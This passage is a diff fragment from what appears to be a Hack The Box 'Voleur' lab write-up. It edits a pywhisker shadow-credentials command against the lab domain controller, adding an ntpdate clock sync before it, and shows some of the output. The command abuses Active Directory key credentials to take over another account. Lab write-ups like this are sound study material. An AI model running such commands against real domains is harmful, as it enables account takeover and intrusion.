@@ -279,7 +279,7 @@ INFO: Compressing output into 20261006005501_bloodhound.zip
 
 
 ```shell
-python3 pywhisker.py -d "voleur.htb" -u "svc_ldap" --target "lacey.miller" --action "add" -k --dc-ip 10.129.232.130 --dc-host DC.voleur.htb -v
+sudo ntpdate DC.voleur.htb && python3 pywhisker.py -d "voleur.htb" -u "svc_ldap" --target "lacey.miller" --action "add" -k --dc-ip 10.129.232.130 --dc-host DC.voleur.htb -v
 2026-10-06 01:18:08.997778 (-0400) +28858.196057 +/- 0.015583 DC.voleur.htb 10.129.232.130 s1 no-leap
 CLOCK: time stepped by 28858.196057
 /home/kali/tools/pywhisker/pywhisker/pywhisker.py:356: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
